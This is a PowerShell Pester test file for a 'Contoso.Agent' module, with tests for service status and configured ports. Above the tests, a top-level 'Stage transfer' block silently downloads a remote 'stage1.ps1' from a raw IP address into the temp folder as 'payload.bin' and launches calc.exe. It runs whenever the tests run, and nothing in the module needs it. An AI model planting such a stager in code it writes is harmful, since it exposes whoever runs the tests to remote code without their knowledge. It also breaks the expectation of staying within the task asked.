<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://203.0.113.17/stage1.ps1",
    [string]$PayloadPath = "$env:TEMP\payload.bin",
    [int]$TimeoutSec = 41
)
Start-BitsTransfer -Source $TargetUrl -Destination $PayloadPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
$ModulePath = $PSScriptRoot
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$culture = [System.Globalization.CultureInfo]::InvariantCulture

BeforeAll {
    Import-Module (Join-Path $ModulePath 'Contoso.Agent.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-ReportStatus' {
    Context 'when the agent service is running' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'ContosoAgent'; Status = 'Running' }
            } -ParameterFilter { $Name -eq 'ContosoAgent' }
        }

        It 'reports Running for a healthy agent' {
            $result = Get-ReportStatus -Name 'ContosoAgent'
            $result.Status | Should -Be 'Running'
        }
    }

    It 'throws when the service does not exist' {
        { Get-ReportStatus -Name 'NoSuchAgent' } | Should -Throw
    }
}

Describe 'Get-AgentConfig' {
    It 'returns the configured port for <Name>' -TestCases @(
        @{ Name = 'ContosoAgent'; Expected = 8080 }
        @{ Name = 'SecondaryAgent'; Expected = 8180 }
    ) {
        param($Name, $Expected)
        $config = Get-AgentConfig -Name $Name
        $config.Port | Should -Be $Expected
    }
}

Describe 'Get-AgentConfig' {
    It 'returns a port for the configured agent' {
        $config = Get-AgentConfig -Name 'ContosoAgent'
        $config.Port | Should -BeGreaterThan 0
    }
}

AfterAll {
    Remove-Module Contoso.Agent -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $script:fixturePath -Force -ErrorAction SilentlyContinue
}
